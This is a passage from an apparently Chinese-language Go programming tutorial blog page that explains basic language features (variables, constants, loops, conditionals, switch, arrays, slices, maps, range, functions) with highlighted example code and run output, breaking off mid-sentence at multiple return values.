class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br></pre></td><td class="code"><pre><code class="hljs go"><span class="hljs-keyword">package</span> main<br><br><span class="hljs-keyword">import</span> <span class="hljs-string">&quot;fmt&quot;</span><br><br><span class="hljs-function"><span class="hljs-keyword">func</span> <span class="hljs-title">main</span><span class="hljs-params">()</span></span> &#123;<br><br>    <span class="hljs-keyword">var</span> a = <span class="hljs-string">&quot;initial&quot;</span><br>    fmt.Println(a)<br><br>    <span class="hljs-keyword">var</span> b, c <span class="hljs-type">int</span> = <span class="hljs-number">1</span>, <span class="hljs-number">2</span><br>    fmt.Println(b, c)<br><br>    <span class="hljs-keyword">var</span> d = <span class="hljs-literal">true</span><br>    fmt.Println(d)<br><br>    <span class="hljs-keyword">var</span> e <span class="hljs-type">int</span><br>    fmt.Println(e)<br><br>    f := <span class="hljs-string">&quot;short&quot;</span><br>    fmt.Println(f)<br>&#125;<br></code></pre></td></tr></table></figure><h2 id="0x03-常量"><a href="#0x03-常量" class="headerlink" title="0x03 常量"></a>0x03 常量</h2><p><code>const</code>用于声明一个常量，可以出现在任何<code>var</code>语句可以出现的地方，<strong>常数表达式可以执行任意精度的运算</strong>，数值型常量没有确定的类型，直到被给定某个类型。</p><p>一个数字可以根据上下文的需要（变量赋值，常数调用）自动确定类型。例如下文<code>math.Sin</code>需要一个<code>float64</code>的参数，n会自动确定类型。</p><figure class="highlight go"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br></pre></td><td class="code"><pre><code class="hljs go"><span class="hljs-keyword">package</span> main<br><br><span class="hljs-keyword">import</span> (<br>    <span class="hljs-string">&quot;fmt&quot;</span><br>    <span class="hljs-string">&quot;math&quot;</span><br>)<br><br><span class="hljs-keyword">const</span> s <span class="hljs-type">string</span> = <span class="hljs-string">&quot;constant&quot;</span><br><br><span class="hljs-function"><span class="hljs-keyword">func</span> <span class="hljs-title">main</span><span class="hljs-params">()</span></span> &#123;<br>    fmt.Println(s)<br><br>    <span class="hljs-keyword">const</span> n = <span class="hljs-number">500000000</span><br><br>    <span class="hljs-keyword">const</span> d = <span class="hljs-number">3e20</span> / n<br>    fmt.Println(d)<br><br>    fmt.Println(<span class="hljs-type">int64</span>(d))<br><br>    fmt.Println(math.Sin(n))<br>&#125;<br></code></pre></td></tr></table></figure><h2 id="0x04-For循环"><a href="#0x04-For循环" class="headerlink" title="0x04 For循环"></a>0x04 For循环</h2><p>for是Go中唯一的循环结构，用法类同于C类语言</p><figure class="highlight go"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br></pre></td><td class="code"><pre><code class="hljs go"><span class="hljs-keyword">package</span> main<br><br><span class="hljs-keyword">import</span> <span class="hljs-string">&quot;fmt&quot;</span><br><br><span class="hljs-function"><span class="hljs-keyword">func</span> <span class="hljs-title">main</span><span class="hljs-params">()</span></span> &#123;<br><br>    i := <span class="hljs-number">1</span><br>    <span class="hljs-keyword">for</span> i &lt;= <span class="hljs-number">3</span> &#123;<br>        fmt.Println(i)<br>        i = i + <span class="hljs-number">1</span><br>    &#125;<br><br>    <span class="hljs-keyword">for</span> j := <span class="hljs-number">7</span>; j &lt;= <span class="hljs-number">9</span>; j++ &#123;<br>        fmt.Println(j)<br>    &#125;<br><br>    <span class="hljs-keyword">for</span> &#123;<br>        fmt.Println(<span class="hljs-string">&quot;loop&quot;</span>)<br>        <span class="hljs-keyword">break</span><br>    &#125;<br><br>    <span class="hljs-keyword">for</span> n := <span class="hljs-number">0</span>; n &lt;= <span class="hljs-number">5</span>; n++ &#123;<br>        <span class="hljs-keyword">if</span> n%<span class="hljs-number">2</span> == <span class="hljs-number">0</span> &#123;<br>            <span class="hljs-keyword">continue</span><br>        &#125;<br>        fmt.Println(n)<br>    &#125;<br>&#125;<br></code></pre></td></tr></table></figure><h2 id="0x05-If-x2F-Else分支"><a href="#0x05-If-x2F-Else分支" class="headerlink" title="0x05 If&#x2F;Else分支"></a>0x05 If&#x2F;Else分支</h2><p>用法类同于C类语言</p><p>需要注意的是，<strong>在 Go 中，条件语句的圆括号不是必需的，但是花括号是必需的。</strong>Go 没有<a href="http://en.wikipedia.org/wiki/%3F:">三目运算符</a>， 即使是基本的条件判断，依然需要使用完整的 <code>if</code> 语句。</p><figure class="highlight go"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br></pre></td><td class="code"><pre><code class="hljs go"><span class="hljs-keyword">package</span> main<br><br><span class="hljs-keyword">import</span> <span class="hljs-string">&quot;fmt&quot;</span><br><br><span class="hljs-function"><span class="hljs-keyword">func</span> <span class="hljs-title">main</span><span class="hljs-params">()</span></span> &#123;<br><br>    <span class="hljs-keyword">if</span> <span class="hljs-number">7</span>%<span class="hljs-number">2</span> == <span class="hljs-number">0</span> &#123;<br>        fmt.Println(<span class="hljs-string">&quot;7 is even&quot;</span>)<br>    &#125; <span class="hljs-keyword">else</span> &#123;<br>        fmt.Println(<span class="hljs-string">&quot;7 is odd&quot;</span>)<br>    &#125;<br><br>    <span class="hljs-keyword">if</span> <span class="hljs-number">8</span>%<span class="hljs-number">4</span> == <span class="hljs-number">0</span> &#123;<br>        fmt.Println(<span class="hljs-string">&quot;8 is divisible by 4&quot;</span>)<br>    &#125;<br><br>    <span class="hljs-keyword">if</span> num := <span class="hljs-number">9</span>; num &lt; <span class="hljs-number">0</span> &#123;<br>        fmt.Println(num, <span class="hljs-string">&quot;is negative&quot;</span>)<br>    &#125; <span class="hljs-keyword">else</span> <span class="hljs-keyword">if</span> num &lt; <span class="hljs-number">10</span> &#123;<br>        fmt.Println(num, <span class="hljs-string">&quot;has 1 digit&quot;</span>)<br>    &#125; <span class="hljs-keyword">else</span> &#123;<br>        fmt.Println(num, <span class="hljs-string">&quot;has multiple digits&quot;</span>)<br>    &#125;<br>&#125;<br></code></pre></td></tr></table></figure><h2 id="0x06-Switch语句"><a href="#0x06-Switch语句" class="headerlink" title="0x06 Switch语句"></a>0x06 Switch语句</h2><p>Go中switch可以不使用常量，从而达到实现if&#x2F;else逻辑的另一种方式</p><blockquote><p>类型开关 (<code>type switch</code>) 比较类型而非值。可以用来发现一个接口值的类型。 在这个例子中，变量 <code>t</code> 在每个分支中会有相应的类型。</p></blockquote><figure class="highlight go"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br></pre></td><td class="code"><pre><code class="hljs go"><span class="hljs-keyword">package</span> main<br><br><span class="hljs-keyword">import</span> (<br>    <span class="hljs-string">&quot;fmt&quot;</span><br>    <span class="hljs-string">&quot;time&quot;</span><br>)<br><br><span class="hljs-function"><span class="hljs-keyword">func</span> <span class="hljs-title">main</span><span class="hljs-params">()</span></span> &#123;<br><br>    i := <span class="hljs-number">2</span><br>    fmt.Print(<span class="hljs-string">&quot;write &quot;</span>, i, <span class="hljs-string">&quot; as &quot;</span>)<br>    <span class="hljs-keyword">switch</span> i &#123;<br>    <span class="hljs-keyword">case</span> <span class="hljs-number">1</span>:<br>        fmt.Println(<span class="hljs-string">&quot;one&quot;</span>)<br>    <span class="hljs-keyword">case</span> <span class="hljs-number">2</span>:<br>        fmt.Println(<span class="hljs-string">&quot;two&quot;</span>)<br>    <span class="hljs-keyword">case</span> <span class="hljs-number">3</span>:<br>        fmt.Println(<span class="hljs-string">&quot;three&quot;</span>)<br>    &#125;<br><br>    <span class="hljs-keyword">switch</span> time.Now().Weekday() &#123;<br>    <span class="hljs-keyword">case</span> time.Saturday, time.Sunday:<br>        fmt.Println(<span class="hljs-string">&quot;It&#x27;s the weekend&quot;</span>)<br>    <span class="hljs-keyword">default</span>:<br>        fmt.Println(<span class="hljs-string">&quot;It&#x27;s a weekday&quot;</span>)<br>    &#125;<br><br>    t := time.Now()<br>    <span class="hljs-keyword">switch</span> &#123;<br>    <span class="hljs-keyword">case</span> t.Hour() &lt; <span class="hljs-number">12</span>:<br>        fmt.Println(<span class="hljs-string">&quot;It&#x27;s before noon&quot;</span>)<br>    <span class="hljs-keyword">default</span>:<br>        fmt.Println(<span class="hljs-string">&quot;It&#x27;s after noon&quot;</span>)<br>    &#125;<br><br>    whatAmI := <span class="hljs-function"><span class="hljs-keyword">func</span><span class="hljs-params">(i <span class="hljs-keyword">interface</span>&#123;&#125;)</span></span> &#123;<br>        <span class="hljs-keyword">switch</span> t := i.(<span class="hljs-keyword">type</span>) &#123;<br>        <span class="hljs-keyword">case</span> <span class="hljs-type">bool</span>:<br>            fmt.Println(<span class="hljs-string">&quot;I&#x27;m a bool&quot;</span>)<br>        <span class="hljs-keyword">case</span> <span class="hljs-type">int</span>:<br>            fmt.Println(<span class="hljs-string">&quot;I&#x27;m an int&quot;</span>)<br>        <span class="hljs-keyword">default</span>:<br>            fmt.Printf(<span class="hljs-string">&quot;Don&#x27;t know type %T\n&quot;</span>, t)<br>        &#125;<br>    &#125;<br>    whatAmI(<span class="hljs-literal">true</span>)<br>    whatAmI(<span class="hljs-number">1</span>)<br>    whatAmI(<span class="hljs-string">&quot;hey&quot;</span>)<br>&#125;<br></code></pre></td></tr></table></figure><h2 id="0x07-数组"><a href="#0x07-数组" class="headerlink" title="0x07 数组"></a>0x07 数组</h2><p>在Go中，数组是一个具有编号且长度固定的元素序列，数组默认值均为零值，内置len函数可以返回数组的长度。</p><p>注意，使用 <code>fmt.Println</code> 打印数组时，会按照 <code>[v1 v2 v3 ...]</code> 的格式打印。</p><figure class="highlight go"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br></pre></td><td class="code"><pre><code class="hljs go"><span class="hljs-keyword">package</span> main<br><br><span class="hljs-keyword">import</span> <span class="hljs-string">&quot;fmt&quot;</span><br><br><span class="hljs-function"><span class="hljs-keyword">func</span> <span class="hljs-title">main</span><span class="hljs-params">()</span></span> &#123;<br><br>    <span class="hljs-keyword">var</span> a [<span class="hljs-number">5</span>]<span class="hljs-type">int</span><br>    fmt.Println(<span class="hljs-string">&quot;emp:&quot;</span>, a)<br><br>    a[<span class="hljs-number">4</span>] = <span class="hljs-number">100</span><br>    fmt.Println(<span class="hljs-string">&quot;set:&quot;</span>, a)<br>    fmt.Println(<span class="hljs-string">&quot;get:&quot;</span>, a[<span class="hljs-number">4</span>])<br><br>    fmt.Println(<span class="hljs-string">&quot;len:&quot;</span>, <span class="hljs-built_in">len</span>(a))<br><br>    b := [<span class="hljs-number">5</span>]<span class="hljs-type">int</span>&#123;<span class="hljs-number">1</span>, <span class="hljs-number">2</span>, <span class="hljs-number">3</span>, <span class="hljs-number">4</span>, <span class="hljs-number">5</span>&#125;<br>    fmt.Println(<span class="hljs-string">&quot;dcl:&quot;</span>, b)<br><br>    <span class="hljs-keyword">var</span> twoD [<span class="hljs-number">2</span>][<span class="hljs-number">3</span>]<span class="hljs-type">int</span><br>    <span class="hljs-keyword">for</span> i := <span class="hljs-number">0</span>; i &lt; <span class="hljs-number">2</span>; i++ &#123;<br>        <span class="hljs-keyword">for</span> j := <span class="hljs-number">0</span>; j &lt; <span class="hljs-number">3</span>; j++ &#123;<br>            twoD[i][j] = i + j<br>        &#125;<br>    &#125;<br>    fmt.Println(<span class="hljs-string">&quot;2d: &quot;</span>, twoD)<br>&#125;<br></code></pre></td></tr></table></figure><h2 id="0x08-切片Slice"><a href="#0x08-切片Slice" class="headerlink" title="0x08 切片Slice"></a>0x08 切片Slice</h2><p>除了基本操作外，slice 支持比数组更丰富的操作。比如 slice 支持内建函数 <code>append</code>， 该函数会返回一个包含了一个或者多个新值的 slice。 注意由于 <code>append</code> 可能返回一个新的 slice，我们需要接收其返回值。</p><p>slice 还可以 <code>copy</code>。这里我们创建一个空的和 <code>s</code> 有相同长度的 slice——<code>c</code>， 然后将 <code>s</code> 复制给 <code>c</code>。</p><p>slice 支持通过 <code>slice[low:high]</code> 语法进行“切片”操作。 例如，右边的操作可以得到一个包含元素 <code>s[2]</code>、<code>s[3]</code> 和 <code>s[4]</code> 的 slice。</p><p>我们可以在一行代码中声明并初始化一个 slice 变量。</p><p>Slice 可以组成多维数据结构。内部的 slice 长度可以不一致，这一点和多维数组不同。</p><p>slice虽然和数组是不同的类型，但是通过<code>fmt.Println</code>打印的输出结果是类似的</p><figure class="highlight go"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br></pre></td><td class="code"><pre><code class="hljs go"><span class="hljs-keyword">package</span> main<br><br><span class="hljs-keyword">import</span> <span class="hljs-string">&quot;fmt&quot;</span><br><br><span class="hljs-function"><span class="hljs-keyword">func</span> <span class="hljs-title">main</span><span class="hljs-params">()</span></span> &#123;<br><br>    s := <span class="hljs-built_in">make</span>([]<span class="hljs-type">string</span>, <span class="hljs-number">3</span>)<br>    fmt.Println(<span class="hljs-string">&quot;emp:&quot;</span>, s)<br><br>    s[<span class="hljs-number">0</span>] = <span class="hljs-string">&quot;a&quot;</span><br>    s[<span class="hljs-number">1</span>] = <span class="hljs-string">&quot;b&quot;</span><br>    s[<span class="hljs-number">2</span>] = <span class="hljs-string">&quot;c&quot;</span><br>    fmt.Println(<span class="hljs-string">&quot;set:&quot;</span>, s)<br>    fmt.Println(<span class="hljs-string">&quot;get:&quot;</span>, s[<span class="hljs-number">2</span>])<br><br>    fmt.Println(<span class="hljs-string">&quot;len:&quot;</span>, <span class="hljs-built_in">len</span>(s))<br><br>    s = <span class="hljs-built_in">append</span>(s, <span class="hljs-string">&quot;d&quot;</span>)<br>    s = <span class="hljs-built_in">append</span>(s, <span class="hljs-string">&quot;e&quot;</span>, <span class="hljs-string">&quot;f&quot;</span>)<br>    fmt.Println(<span class="hljs-string">&quot;apd:&quot;</span>, s)<br><br>    c := <span class="hljs-built_in">make</span>([]<span class="hljs-type">string</span>, <span class="hljs-built_in">len</span>(s))<br>    <span class="hljs-built_in">copy</span>(c, s)<br>    fmt.Println(<span class="hljs-string">&quot;cpy:&quot;</span>, c)<br><br>    l := s[<span class="hljs-number">2</span>:<span class="hljs-number">5</span>]<br>    fmt.Println(<span class="hljs-string">&quot;sl1:&quot;</span>, l)<br><br>    l = s[:<span class="hljs-number">5</span>]<br>    fmt.Println(<span class="hljs-string">&quot;sl2:&quot;</span>, l)<br><br>    l = s[<span class="hljs-number">2</span>:]<br>    fmt.Println(<span class="hljs-string">&quot;sl3:&quot;</span>, l)<br><br>    t := []<span class="hljs-type">string</span>&#123;<span class="hljs-string">&quot;g&quot;</span>, <span class="hljs-string">&quot;h&quot;</span>, <span class="hljs-string">&quot;i&quot;</span>&#125;<br>    fmt.Println(<span class="hljs-string">&quot;dcl:&quot;</span>, t)<br><br>    twoD := <span class="hljs-built_in">make</span>([][]<span class="hljs-type">int</span>, <span class="hljs-number">3</span>)<br>    <span class="hljs-keyword">for</span> i := <span class="hljs-number">0</span>; i &lt; <span class="hljs-number">3</span>; i++ &#123;<br>        innerLen := i + <span class="hljs-number">1</span><br>        twoD[i] = <span class="hljs-built_in">make</span>([]<span class="hljs-type">int</span>, innerLen)<br>        <span class="hljs-keyword">for</span> j := <span class="hljs-number">0</span>; j &lt; innerLen; j++ &#123;<br>            twoD[i][j] = i + j<br>        &#125;<br>    &#125;<br>    fmt.Println(<span class="hljs-string">&quot;2d: &quot;</span>, twoD)<br>&#125;<br></code></pre></td></tr></table></figure><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><code class="hljs shell"><span class="hljs-meta prompt_">$ </span><span class="language-bash">go run slices.go</span><br>emp: [  ]<br>set: [a b c]<br>get: c<br>len: 3<br>apd: [a b c d e f]<br>cpy: [a b c d e f]<br>sl1: [c d e]<br>sl2: [a b c d e]<br>sl3: [c d e f]<br>dcl: [g h i]<br>2d:  [[0] [1 2] [2 3 4]]<br></code></pre></td></tr></table></figure><h2 id="0x09-Map"><a href="#0x09-Map" class="headerlink" title="0x09 Map"></a>0x09 Map</h2><p>map与C++的STL的map类似</p><p>要创建一个空 map，需要使用内建函数 <code>make</code>：<code>make(map[key-type]val-type)</code>。使用<code>fmt.Println</code>可以输出它的所有键值，内建<code>len</code>获取长度和<code>delete</code>移除一个键值对</p><p>当从一个 map 中取值时，还有可以选择是否接收的第二个返回值，该值表明了 map 中是否存在这个键。 这可以用来消除 <code>键不存在</code> 和 <code>键的值为零值</code> 产生的歧义， 例如 <code>0</code> 和 <code>&quot;&quot;</code>。这里我们不需要值，所以用 <em>空白标识符(blank identifier)</em> _ 将其忽略。</p><p>注意，使用 <code>fmt.Println</code> 打印一个 map 的时候， 是以 <code>map[k:v k:v]</code> 的格式输出的。</p><figure class="highlight go"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br></pre></td><td class="code"><pre><code class="hljs go"><span class="hljs-keyword">package</span> main<br><br><span class="hljs-keyword">import</span> <span class="hljs-string">&quot;fmt&quot;</span><br><br><span class="hljs-function"><span class="hljs-keyword">func</span> <span class="hljs-title">main</span><span class="hljs-params">()</span></span> &#123;<br><br>    m := <span class="hljs-built_in">make</span>(<span class="hljs-keyword">map</span>[<span class="hljs-type">string</span>]<span class="hljs-type">int</span>)<br><br>    m[<span class="hljs-string">&quot;k1&quot;</span>] = <span class="hljs-number">7</span><br>    m[<span class="hljs-string">&quot;k2&quot;</span>] = <span class="hljs-number">13</span><br><br>    fmt.Println(<span class="hljs-string">&quot;map:&quot;</span>, m)<br><br>    v1 := m[<span class="hljs-string">&quot;k1&quot;</span>]<br>    fmt.Println(<span class="hljs-string">&quot;v1: &quot;</span>, v1)<br><br>    fmt.Println(<span class="hljs-string">&quot;len:&quot;</span>, <span class="hljs-built_in">len</span>(m))<br><br>    <span class="hljs-built_in">delete</span>(m, <span class="hljs-string">&quot;k2&quot;</span>)<br>    fmt.Println(<span class="hljs-string">&quot;map:&quot;</span>, m)<br><br>    _, prs := m[<span class="hljs-string">&quot;k2&quot;</span>]<br>    fmt.Println(<span class="hljs-string">&quot;prs:&quot;</span>, prs)<br><br>    n := <span class="hljs-keyword">map</span>[<span class="hljs-type">string</span>]<span class="hljs-type">int</span>&#123;<span class="hljs-string">&quot;foo&quot;</span>: <span class="hljs-number">1</span>, <span class="hljs-string">&quot;bar&quot;</span>: <span class="hljs-number">2</span>&#125;<br>    fmt.Println(<span class="hljs-string">&quot;map:&quot;</span>, n)<br>&#125;<br></code></pre></td></tr></table></figure><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><code class="hljs shell"><span class="hljs-meta prompt_">$ </span><span class="language-bash">go run maps.go</span> <br>map: map[k1:7 k2:13]<br>v1:  7<br>len: 2<br>map: map[k1:7]<br>prs: false<br>map: map[foo:1 bar:2]<br></code></pre></td></tr></table></figure><h2 id="0x10-Range遍历"><a href="#0x10-Range遍历" class="headerlink" title="0x10 Range遍历"></a>0x10 Range遍历</h2><p><code>range</code> 在数组和 slice 中提供对每项的索引和值的访问。 有时我们不需要索引，所以我们使用 <em>空白标识符</em> <code>_</code> 将其忽略。</p><figure class="highlight go"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br></pre></td><td class="code"><pre><code class="hljs go"><span class="hljs-keyword">package</span> main<br><br><span class="hljs-keyword">import</span> <span class="hljs-string">&quot;fmt&quot;</span><br><br><span class="hljs-function"><span class="hljs-keyword">func</span> <span class="hljs-title">main</span><span class="hljs-params">()</span></span> &#123;<br><br>    nums := []<span class="hljs-type">int</span>&#123;<span class="hljs-number">2</span>, <span class="hljs-number">3</span>, <span class="hljs-number">4</span>&#125;<br>    sum := <span class="hljs-number">0</span><br>    <span class="hljs-keyword">for</span> _, num := <span class="hljs-keyword">range</span> nums &#123;<br>        sum += num<br>    &#125;<br>    fmt.Println(<span class="hljs-string">&quot;sum:&quot;</span>, sum)<br><br>    <span class="hljs-keyword">for</span> i, num := <span class="hljs-keyword">range</span> nums &#123;<br>        <span class="hljs-keyword">if</span> num == <span class="hljs-number">3</span> &#123;<br>            fmt.Println(<span class="hljs-string">&quot;index:&quot;</span>, i)<br>        &#125;<br>    &#125;<br><br>    kvs := <span class="hljs-keyword">map</span>[<span class="hljs-type">string</span>]<span class="hljs-type">string</span>&#123;<span class="hljs-string">&quot;a&quot;</span>: <span class="hljs-string">&quot;apple&quot;</span>, <span class="hljs-string">&quot;b&quot;</span>: <span class="hljs-string">&quot;banana&quot;</span>&#125;<br>    <span class="hljs-keyword">for</span> k, v := <span class="hljs-keyword">range</span> kvs &#123;<br>        fmt.Printf(<span class="hljs-string">&quot;%s -&gt; %s\n&quot;</span>, k, v)<br>    &#125;<br><br>    <span class="hljs-keyword">for</span> k := <span class="hljs-keyword">range</span> kvs &#123;<br>        fmt.Println(<span class="hljs-string">&quot;key:&quot;</span>, k)<br>    &#125;<br><br>    <span class="hljs-keyword">for</span> i, c := <span class="hljs-keyword">range</span> <span class="hljs-string">&quot;go&quot;</span> &#123;<br>        fmt.Println(i, c)<br>    &#125;<br>&#125;<br></code></pre></td></tr></table></figure><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><code class="hljs shell"><span class="hljs-meta prompt_"></span><br><span class="hljs-meta prompt_">$ </span><span class="language-bash">go run range.go</span><br>sum: 9<br>index: 1<br>a -&gt; apple<br>b -&gt; banana<br>key: a<br>key: b<br>0 103<br>1 111<br></code></pre></td></tr></table></figure><h2 id="0x11-函数"><a href="#0x11-函数" class="headerlink" title="0x11 函数"></a>0x11 函数</h2><p>Go 需要明确的 return，也就是说，它不会自动 return 最后一个表达式的值</p><p><strong>当多个连续的参数为同样类型时， 可以仅声明最后一个参数的类型，忽略之前相同类型参数的类型声明。</strong></p><figure class="highlight go"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br></pre></td><td class="code"><pre><code class="hljs go"><span class="hljs-keyword">package</span> main<br><br><span class="hljs-keyword">import</span> <span class="hljs-string">&quot;fmt&quot;</span><br><br><span class="hljs-function"><span class="hljs-keyword">func</span> <span class="hljs-title">plus</span><span class="hljs-params">(a <span class="hljs-type">int</span>, b <span class="hljs-type">int</span>)</span></span> <span class="hljs-type">int</span> &#123;<br><br>    <span class="hljs-keyword">return</span> a + b<br>&#125;<br><br><span class="hljs-function"><span class="hljs-keyword">func</span> <span class="hljs-title">plusPlus</span><span class="hljs-params">(a, b, c <span class="hljs-type">int</span>)</span></span> <span class="hljs-type">int</span> &#123;<br>    <span class="hljs-keyword">return</span> a + b + c<br>&#125;<br><br><span class="hljs-function"><span class="hljs-keyword">func</span> <span class="hljs-title">main</span><span class="hljs-params">()</span></span> &#123;<br><br>    res := plus(<span class="hljs-number">1</span>, <span class="hljs-number">2</span>)<br>    fmt.Println(<span class="hljs-string">&quot;1+2 =&quot;</span>, res)<br><br>    res = plusPlus(<span class="hljs-number">1</span>, <span class="hljs-number">2</span>, <span class="hljs-number">3</span>)<br>    fmt.Println(<span class="hljs-string">&quot;1+2+3 =&quot;</span>, res)<br>&#125;<br></code></pre></td></tr></table></figure><h2 id="0x12-多返回值"><a href="#0x12-多返回值" class="headerlink" title="0x12 多返回值"></a>0x12 多返回值</h2><p>Go 原生支持 _多返回值_。 这个特性在 Go 语言中经常用到，例如用来同时返回一个函数的结果和错误信息。<code>(int, int)</code> 在这个函数中标志着这个函数返回 2 个 